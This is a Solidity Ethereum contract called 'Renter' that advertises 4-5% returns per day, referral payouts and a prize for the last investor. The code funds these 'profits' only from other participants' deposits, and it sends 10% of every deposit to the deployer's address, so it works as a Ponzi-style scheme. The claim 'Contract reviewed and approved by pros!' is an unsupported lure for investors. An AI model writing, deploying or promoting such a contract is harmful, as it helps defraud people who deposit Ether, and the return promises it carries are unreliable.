pragma solidity ^0.4.25;

/**
 *
 * Renter Contract
 *  - GAIN 4-5% PER 24 HOURS (every 5900 blocks)
 *  - 10% of the contributions go to project advertising
 *
 * How to use:
 *  1. Send 0.01, 0.1 or 1 Ether to make an investment.
 *  2a. Claim your profit by sending 0 Ether transaction (every minute,
 *      every day, every week, i don't care unless you're spending too
 *      much on GAS).
 *  OR
 *  2b. Send 0.01, 0.1 or 1 Ether to reinvest AND get your profit at the
 *      same time.
 *  3. Participants with referrers receive 5% instead of 4%.
 *  4. To become someone's referral, enter the address of the referrer
 *     in the field DATA when sending the first deposit.
 *  5. Only a participant who deposited at least 0.01 Ether can become a
 *     referrer.
 *  6. Referrers receive 10% of each deposit of referrals immediately to
 *     their wallet.
 *  7. To receive the prize fund, you need to be the last investor for at
 *     least 42 blocks (~10 minutes), after which you need to send 0 Ether
 *     or reinvest.
 *
 * RECOMMENDED GAS LIMIT: 200000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
 
contract Renter {
    address support = msg.sender;
    uint public prizeFund;
    address public lastInvestor;
    uint public lastInvestedAt;
    
    uint public totalInvestors;
    uint public totalInvested;
    
    // records amounts invested
    mapping (address => uint) public invested;
    // records blocks at which investments were made
    mapping (address => uint) public atBlock;
    // records referrers
    mapping (address => address) public referrers;
    
    function bytesToAddress(bytes source) internal pure returns (address parsedAddress) {
        assembly {
            parsedAddress := mload(add(source,0x14))
        }
        return parsedAddress;
    }

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        require(msg.value == 0 || msg.value == 0.01 ether
            || msg.value == 0.1 ether || msg.value == 1 ether);
        
        prizeFund += msg.value * 7 / 100;
        uint transferAmount;
        
        support.transfer(msg.value / 10);
        
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            uint max = (address(this).balance - prizeFund) * 9 / 10;
            
            // calculate profit amount as such:
            // amount = (amount invested) * (4 - 5)% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint percentage = referrers[msg.sender] == 0x0 ? 4 : 5;
            uint amount = invested[msg.sender] * percentage / 100 * (block.number - atBlock[msg.sender]) / 5900;
            if (amount > max) {
                amount = max;
            }

            transferAmount += amount;
        } else {
            totalInvestors++;
        }
        
        if (lastInvestor == msg.sender && block.number >= lastInvestedAt + 42) {
            transferAmount += prizeFund;
            prizeFund = 0;
        }
        
        if (msg.value > 0) {
            if (invested[msg.sender] == 0 && msg.data.length == 20) {
                address referrerAddress = bytesToAddress(bytes(msg.data));
                require(referrerAddress != msg.sender);     
                if (invested[referrerAddress] > 0) {
                    referrers[msg.sender] = referrerAddress;
                }
            }
            
            if (referrers[msg.sender] != 0x0) {
                referrers[msg.sender].transfer(msg.value / 10);
            }
            
            lastInvestor = msg.sender;
            lastInvestedAt = block.number;
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
        totalInvested += msg.value;
        
        if (transferAmount > 0) {
            msg.sender.transfer(transferAmount);
        }
    }
}